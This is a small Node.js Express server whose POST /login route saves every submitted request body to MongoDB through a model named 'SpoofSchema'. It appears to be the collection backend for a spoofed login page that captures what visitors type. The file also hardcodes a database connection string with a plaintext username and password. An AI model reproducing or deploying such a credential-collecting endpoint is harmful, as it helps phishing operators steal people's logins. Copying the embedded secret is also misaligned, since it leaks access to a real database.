const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const mongoose = require('mongoose');

var cors = require('cors');
const loginRoutes = express.Router();
let SpoofSchema = require('./spoof.model');
let PORT = process.env.PORT || 3001;
app.use(cors());
app.use(bodyParser.urlencoded({extended: true}))
app.use(bodyParser.json());

mongoose.connect('mongodb+srv://nithinmoorthy11:Hello123@cluster0.wnzxq.mongodb.net/myFirstDatabase?retryWrites=true&w=majority', {useNewUrlParser: true});
app.use('/login', loginRoutes);

const connection= mongoose.connection;
connection.once('open', function() {
  console.log("Successful Connection to DB");
})


loginRoutes.route('/').post(function(req,res) {
  let spoofExample = req.body;
  let spoofObj = new SpoofSchema(spoofExample);
  console.log(spoofObj);
  spoofObj.save()
    .then(spoofResponse => {
      res.json({'spoof': 'spoof saved successfully'});
    })
    .catch(err => {
      console.log(err);
    });
});

app.listen(PORT, function(req,res) {
  console.log("LISTENING 3001");
});
